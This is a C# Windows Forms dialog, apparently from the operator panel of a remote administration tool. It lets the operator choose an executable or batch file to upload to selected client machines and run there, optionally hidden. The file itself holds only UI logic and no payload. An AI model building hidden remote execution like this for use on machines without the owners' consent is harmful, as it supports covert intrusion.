using System;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    public partial class FrmUploadAndExecute : Form
    {
        private readonly int _selectedClients;

        public FrmUploadAndExecute(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();
        }

        private void FrmUploadAndExecute_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Upload & Execute", _selectedClients);
            chkRunHidden.Checked = UploadAndExecute.RunHidden;
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable (*.exe)|*.exe|Batch (*.bat)|*.bat";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = ofd.FileName;
                }
            }
        }

        private void btnUploadAndExecute_Click(object sender, EventArgs e)
        {
            UploadAndExecute.FilePath = File.Exists(txtPath.Text) ? txtPath.Text : string.Empty;
            UploadAndExecute.RunHidden = chkRunHidden.Checked;

            this.DialogResult = DialogResult.OK;
            this.Close();
        }
    }
}